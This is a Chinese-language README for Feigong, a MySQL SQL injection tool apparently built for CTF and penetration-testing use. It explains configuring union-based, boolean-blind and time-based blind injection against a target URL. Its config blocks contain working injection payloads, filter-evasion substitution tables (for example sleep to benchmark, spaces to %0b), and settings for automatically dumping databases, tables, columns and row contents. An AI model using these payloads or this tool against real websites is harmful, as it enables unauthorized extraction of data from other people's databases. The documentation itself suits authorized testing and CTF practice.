# Feigong --非攻
 [![Feigong Release](https://img.shields.io/github/release/LoRexxar/Feigong.svg)]()
 [![Feigong Release](https://landscape.io/github/LoRexxar/Feigong/master/landscape.svg?style=flat)]()
 [![Feigong Open Issue](https://img.shields.io/github/issues-raw/LoRexxar/Feigong.svg)]()
 [![Feigong Close Issue](https://img.shields.io/github/issues-closed-raw/LoRexxar/Feigong.svg)]()
 [![GitHub watchers](https://img.shields.io/github/watchers/LoRexxar/Feigong.svg?style=social&label=Watch)]()
 [![GitHub forks](https://img.shields.io/github/forks/LoRexxar/Feigong.svg?style=social&label=Fork)]()
 [![GitHub stars](https://img.shields.io/github/stars/LoRexxar/Feigong.svg?style=social&label=Star)]()
 [![GitHub followers](https://img.shields.io/github/followers/LoRexxar.svg?style=social&label=Follow)](https://github.com/LoRexxar/)

## 非攻
取自《秦时明月》--非攻，针对不同情况自由变化的武器

Feigong，针对各种情况自由变化的mysql注入脚本

Feigong，In view of the different things freely change the mysql injection script

## 什么是非攻？ ##

在sqlmap的使用过程中，常常碰到很普通的绕过过滤方式，例如空格-->%0b、%0a，但是却没办法使用sqlmap来获取数据的情况，于是花了很长时间来完善脚本，让非攻可以通过修改config.py一个文件中的设置，让非攻在面对不同情况时成为了灵活多变的注入脚本...

非攻目前集成了对mysql的normal、build、time，3种注入方式...

### 在使用非攻之前 ###

1、首先你需要找到一个注入点（在考虑写一个这样的工具）

2、判断数据库为mysql

3、通过巧妙地过滤可以获取数据

4、开始使用非攻

## TODO ##

* <del>完成基本功能</del>
* <del>优化log存储方式</del>
* <del>优化build注入、time注入算法</del>
* <del>优化解包函数，避免自定义解包</del>
* 添加线程池优化注入速度
* 完善对拓展函数的支持
* 增加更多注入语句
* 增加更多绕过过滤方式
* 增加多种数据库


## 更新日志 ##
* 2016-8-5
	* Feigong 0.9.9完成
	* 增加 payload处理模块完成
* 2016-8-9
	* Feigong 1.0.0完成
	* 增加 log对文件的输出
	* 优化 部分错误处理
	* 增加 较为完整的文档
* 2016-8-24
    * Feigong 1.0.1完成
    * 优化 盲注算法
    * 优化 整体结构
* 2016-8-25
    * Feigong 1.1.0完成
    * 优化 time盲注算法,从100->7
* 2016-8-26
    * Feigong 1.1.1完成
    * 优化 整体结构，避免了自定义解包函数
* 2016-8-27
    * Feigong 1.2.0完成
    * 重构 config->config、advanced_config
    * 优化 整体结构，大幅度减少冗余代码

## 使用文档 ##
```
Feigong
│  .gitignore
│  feigong.py
│  README.md
│
├─demo
│  ├─demo1
│  │      advanced_config.py
│  │      config.py
│  │
│  └─demo2
│          advanced_config.py
│          config.py
│
├─lib
│      Conpayload.py
│      data.py
│      dealpayload.py
│      log.py
│      unpack.py
│      __init__.py
│
├─log
│
└─sqlier
    │  advanced_config.py
    │  config.py
    │  __init__.py
    │
    ├─configuration
    │      buildconfig.py
    │      __init__.py
    │
    ├─default
    │      advanced_config_default.py
    │      config_default.py
    │      __init__.py
    │
    ├─tamper
    │      expand.py
    │      __init__.py
    │
    └─techniques
            columns.py
            content.py
            database.py
            tables.py
            test.py
            __init__.py
```

Feigong一切一切的核心在于sqlier/config.py和sqlier/advanced_config.py,代码层的自定义可以面对任何情况

### 安装 ###

你可以通过点击下载，或者git clone来获取源码
```
git clone https://github.com/LoRexxar/Feigong.git
```

### 使用 ###

首先你需要安装依赖
```
pip install -r requirements.txt
```

打开对应Feigong的目录，跑一下默认demo看看结果
```
python feigong.py
```

### 开始 ###

Feigong是通过修改sqlier/config.py & sqlier/advanced_config.py来实现注入的，config.py是feigong的基础配置，advanced_config.py是进阶配置，而default中是默认的配置文件，以免默认修改过后找不到正确的配置。

config.py是基础配置，只有基础配置完成的情况下才能进行正常的配置。
```
class BaseConfig:
    def __init__(self):
        """
        基类初始化，整个注入工具的核心配置
        """
        # 目标url
        self.url = 'http://demo.lorexxar.pw/get.php'

        # 请求头参数
        # cookies = {"username":data,"path":"/admin/","domain":"451bf8ea3268360ee.jie.sangebaimao.com"}
        # self.headers = {"Cookie": "username=" + data + "; captcha=od8lgg6f7i71q16j9rd7p7j9a2; username=" + data}
        self.headers = {}

        # 传参方式 0为GET 1为POST
        SqliRequest = (
            "GET",
            "POST"
        )
        self.sqlirequest = SqliRequest[0]

        # 注入方式 0为正常 1为盲注 2为时间盲注
        SqliMethod = (
            "normal",
            "build",
            "time"
        )
        self.sqlimethod = SqliMethod[1]
        """
        从这里开始，要进入对于payload的配置了，首先需要对注入语句进行配置，然后注入语句通过自定义的替换表，之后构造注入语句为请求
        payload===>替换为指定payload===>自定义替换表===>请求===>开始注入

        若为normal注入，必须构造返回BSqlier的payload，并通过test模式修改解包函数直至可以获取返回值（必须以空格为分隔符，结尾必须只有一个词（结尾可以通过修改自定义替换表中的值来修改））
        eg: self.payload = "padding' union all select 1,'Feigong' #"

        若为build注入，则为与、或条件构造，如果是与注入，padding必须为返回值的条件
        eg: self.payload = "padding' && 2333 #"

        若为time注入，则可以使用上面两种的任何一种，格式与其相符，同样，关键位置使用2333或者'Feigong'填充
        eg: self.payload = "padding' union all select 1,'Feigong' #"
        eg: self.payload = "padding' && 2333 #"

        """
        self.payload = "padding' && 2333 #"

        """
        配置请求,把请求中payload的位置设置为Feigong（如果拼错了就会全部无效...）
        self.requesetformat = "user=Feigong&passwd=ddog123&submit=Log+In"
        self.requesetformat = {"user": "Feigong", "password": "a"}
        """
        self.requesetformat = "user=Feigong&passwd=ddog123&submit=Log+In"
        # self.requesetformat = {"user": "Feigong", "password": "a"}

        """
        在注入之前，你首先需要测试，test.py中包含所有的测试函数，包括test、get_now_database、get_version、get_user

        self.wtest是是否进入测试模式、测试模式优先级最高和普通模式不兼容，默认开启

        而testmethod则是选择使用那种测试，互相兼容可以同时跑
        """
        self.wtest = False

        self.testmethod = {
            "test": 0,
            "database": 1,
            "version": 1,
            "user": 1
        }
        """
        正式注入模式的选择，test模式开启时，无论正式注入模式是否开启都无效，默认开启

        all为全部注入，将自动从database注入直到数据前10条
        content为注入数据，可以预设columns、tables和database
        columns为注入列名，可以预设tables和database
        tables为注入表名，可以预设database
        database为注入表名
        统一规则为如果不预设，则自动调用上一层的类获取数据
        """
        self.wsqli = True

        self.sqlilocation = {
            "content": 1,
            "columns": 1,
            "tables": 1,
            "database": 1
        }

```

advanced_config.py是进阶配置，进阶配置可以配置一些特殊的请况
```
class AdvanceConfig(BaseConfig):
    def __init__(self):
        """
        进阶配置，如果对代码不够熟悉，建议不修改这部分配置
        """
        BaseConfig.__init__(self)
        # 版本号
        self.version = "V1.2.0"

        # 初始化request
        self.s = requests.Session()

        # log日志级别，debug为显示大部分信息，info为注入结果的显示
        LogLevel = (
            logging.DEBUG,
            logging.INFO,
            logging.WARN
        )
        self.loglevel = LogLevel[0]

        """
        若注入方式为build盲注，则通过返回长度判断
        永真条件的长度（盲注时需要使用），默认为0，可设置, 如果不设置会默认使用self.payload获取的返回长度为self.len
        """
        self.len = 0

        """
        若注入方式为time，你需要设置延时，建议根据自己的网络环境选择，如果网络环境较差，建议还是大一点儿
        建议2-5，现在版本还是单线程，所以时间盲注会比较慢...
        """
        self.time = 3

        """
        database可以自定义，默认为空，若为空会调用get_database(),这里是一个列表，必须按照列表格式
        self.databases_name = ['test', 'test2']（当然，如果database_name错误...则不会注到数据）
        """
        # self.databases_name = ['hctfsqli1', 'test']
        self.databases_name = []

        """
        然后是table name，tables_name的格式为字典+元组
        self.tables_name = {'hctfsqli1': ('test1', 'test2'), 'test',('test1', 'test2')}(如果有写错某些值，则会注不到数据)
        """
        # self.tables_name = {'test': ('test',), 'hctfsqli1': ('hhhhctf', 'test', 'users')}
        self.tables_name = {}

        """
        然后是self.columns_name，columns_name的格式为字典套字典+元组
        self.columns_name = {'test': {'test': ('test', 'test1', 'test2')}, 'test2': {'test': ('test', 'test1', 'test2')}}
        (同样，如果有写错的值，则会注入不到数据)
        """
        # self.columns_name = {'test': {'test': ('test',)}, 'hctfsqli1': {'test': ('test1', 'testtest', 'flag1'), 'users': ('id', 'username'), 'hhhhctf': ('flag',)}}
        self.columns_name = {}

        """
        当选择注入content时，你需要指定输入数据的上限，默认为10
        """
        self.content_count = 10

        """
        配置自定义替换表,合理的替换表配置远远可以替换出想要的所有情况payload
        """

        self.filter = {
            # padding 为填充字段，build与注入要求padding必须为真值
            'padding': 'user1',
            # 符号替换（url encode是get默认自带的，不需要修改）
            '\'': '\'',
            '\"': '\"',
            '&': '&',
            '|': '|',
            '>': '>',
            '<': '<',
            '=': '=',
            '.': '.',
            # 注入语句关键字替换
            'union': 'union',
            'select': 'SELECT',
            'insert': 'insert',
            'update': 'update',
            'delete': 'delete',
            'limit': 'limit',
            'where': 'where',
            # 注入函数
            'user': 'user',
            'database': 'database',
            'version': 'version',
            'if': 'if',
            'ifnull': 'ifnull',
            'concat': 'concat',
            'ascii': 'ascii',  # hex()、bin()
            'count': 'count',
            'substring': 'substring',  # mid()、substr()
            'length': 'length',
            "sleep(" + repr(self.time) + ")": "sleep(" + repr(self.time) + ")",  # benchmark()
            # 库名表名关键字
            'information_schema': 'information_schema',
            'schemata': 'schemata',
            'schema_name': 'schema_name',
            'tables': 'tables',
            'table_name': 'table_name',
            'columns': 'columns',
            'column_name': 'column_name',
            # 然后是特殊的字符
            ' ': ' ',  # 由于过滤后自动进行url encode，所以替换表不能使用url encode过的字符，eg:%0a->\n %0b->\x0b
            '#': '#'  # --+
        }

        """
        初始化dealpayload类，传入self.sqlimethod，self.payload, self.requestformat, self.filter
        """
        self.dealpayload = ConPayload(self.sqlirequest, self.payload, self.requesetformat, self.filter, self.time)
```


Feigong现在的版本还仅仅支持对于mysql的3种注入方式：
- 普通注入（normal）：也就是会有返回的注入点
- 盲注（build）：没有返回，但可以通过真假条件来判断执行结果
- 时间盲注（time）：没有返回，但是可以通过返回请求的间隔时间来判断真假


#### 基础配置 ####

首先你需要进行基础的配置，首先是基础的目标url，请求头，传参方式，注入方式等...

```
# 目标url
self.url = 'http://demo.lorexxar.pw/get.php'
self.s = requests.Session()

# 请求头参数
# cookies = {"username":data,"path":"/admin/","domain":"451bf8ea3268360ee.jie.sangebaimao.com"}
# self.headers = {"Cookie": "username=" + data + "; captcha=od8lgg6f7i71q16j9rd7p7j9a2; username=" + data}
self.headers = {}

# 传参方式 0为GET 1为POST
SqliRequest = (
    "GET",
    "POST"
)
self.sqlirequest = SqliRequest[0]

# 注入方式 0为正常 1为盲注 2为时间盲注
SqliMethod = (
    "normal",
    "build",
    "time"
)
self.sqlimethod = SqliMethod[0]
```

上面的每一步都给出了相应的参数，目标url中，不需要加上参数，关于参数的配置，我们会在后面进行...

ps:如果出现get和post请求都必须存在的情况，若注入点再post，可以直接把get请求代入到目标url中，如果反过来，则暂时不支持

#### 注入方式的配置 ####

根据这一段的选择，我们会在后面进行不同的配置选项
```
SqliMethod = (
    "normal",
    "build",
    "time"
)
self.sqlimethod = SqliMethod[0]
```

##### normal #####

如果注入模式为normal，需要定义基础payload

```
self.payload = "padding' union all select 1,'Feigong' #"
```
normal注入的基础payload要求必须返回**Feigong**

##### build #####

如果注入模式为build，则需要配置基础payload，设置真值是返回的页面长度

```
若为build注入，则为与、或条件构造，如果是与注入，padding必须为返回值的条件
eg: self.payload = "padding' && 2333 #"
```

对于真值时的返回长度,可自定义，也可以不定义，因为test.py中的test函数会自动设置self.len（使用基础payload）
```
 self.len = 0
```

##### time #####

如果注入模式为time，除了要设置基础payload以外，还需要设置睡眠时间，这部分在进阶配置中，默认为2
```
 self.time = 2
```
如果网络环境太差，建议（2-5）

若为time注入，则可以使用上面两种的任何一种，格式与其相符，同样，关键位置使用2333或者'Feigong'填充
```
eg: self.payload = "padding' union all select 1,'Feigong' #"
eg: self.payload = "padding' && 2333 #"
```

#### 配置请求格式 ####

配置请求,把请求中payload的位置设置为Feigong（如果拼错了就会全部无效...）

```        
self.requesetformat = "user=Feigong&passwd=ddog123&submit=Log+In"
self.requesetformat = {"user": "Feigong", "password": "a"}
```

上面两个分别是对于get和post请求的请求格式

#### 选择注入模式 ####

在注入之前，你首先需要测试，test.py中包含所有的测试函数，包括test、get_now_database、get_version、get_user

self.wtest是是否进入测试模式、测试模式优先级最高和普通模式不兼容，默认开启

而testmethod则是选择使用那种测试，互相兼容可以同时跑

```
self.wtest = True

self.testmethod = {
    "test": 0,
    "database": 1,
    "version": 1,
    "user": 1
}
```

在test成功后，就要开始正式的注入模式了...

正式注入模式的选择，test模式开启时，无论正式注入模式是否开启都无效，默认开启

content为注入数据，可以预设columns、tables和database，默认注入10条数据
columns为注入列名，可以预设tables和database
tables为注入表名，可以预设database
database为注入表名
统一规则为如果不预设，则自动调用上一层的类获取数据

```
self.wsqli = True

self.sqlilocation = {
    "content": 1,
    "columns": 1,
    "tables": 1,
    "database": 1
}
```

#### 进阶配置 ####
在进阶配置中，我们是可以通过预设值来减少注入的范围


database可以自定义，默认为空，若为空会调用get_database(),这里是一个列表，必须按照列表格式（当然，如果database_name错误...则不会注到数据）
```
self.databases_name = ['hctfsqli1', 'test']
self.databases_name = []
```

然后是table name，tables_name的格式为字典+元组(如果有写错某些值，则会注不到数据)

```
self.tables_name = {'test': ('test',), 'hctfsqli1': ('hhhhctf', 'test', 'users')}
self.tables_name = {}
```

然后是self.columns_name，columns_name的格式为字典套字典+元组(同样，如果有写错的值，则会注入不到数据)
```
self.columns_name = {'test': {'test': ('test',)}, 'hctfsqli1': {'test': ('test1', 'testtest', 'flag1'), 'users': ('id', 'username'), 'hhhhctf': ('flag',)}}
self.columns_name = {}
```

当选择注入content时，你需要指定输入数据的上限，默认为10
```
self.content_count = 10
```

#### 配置自定义替换表 ####

这部分一是在进阶配置中

配置自定义替换表,合理的替换表配置远远可以替换出想要的所有情况payload

合理的配置替换表，可以定制任意payload，例如
- **#-->group by a#**
- **sleep(2)-->benchmark(10000000,sha(1))**

总之，如果你对代码足够熟悉，可以生成任意payload

```
self.filter = {
	# padding 为填充字段，build与注入要求padding必须为真值

	'padding': 'user',
	# 符号替换（url encode是get默认自带的，不需要修改）

	'\'': '\'',
	'\"': '\"',
	'&': '&',
	'|': '|',
	'>': '>',
	'<': '<',
	'=': '=',
	'.': '.',
	# 注入语句关键字替换

	'union': 'union',
	'select': 'SELECT',
	'insert': 'insert',
	'update': 'update',
	'delete': 'delete',
	'limit': 'limit',
	'where': 'where',
	# 注入函数

	'user': 'user',
	'database': 'database',
	'version': 'version',
	'if': 'if',
	'ifnull': 'ifnull',
	'concat': 'concat',
	'ascii': 'ascii',  # hex()、bin()
	'count': 'count',
	'substring': 'substring',  # mid()、substr()
	'length': 'length',
	"sleep(" + repr(self.time) + ")": "sleep(" + repr(self.time) + ")",  # benchmark()
	# 库名表名关键字

	'information_schema': 'information_schema',
	'schemata': 'schemata',
	'schema_name': 'schema_name',
	'tables': 'tables',
	'table_name': 'table_name',
	'columns': 'columns',
	'column_name': 'column_name',
	# 然后是特殊的字符

	' ': ' ',   # 由于过滤后自动进行url encode，所以替换表不能使用url encode过的字符，eg:%0a->\n %0b->\x0b
	'#': '#'    # --+
}
```

#### 开始注入 ####

开始注入
```
python feigong.py
```
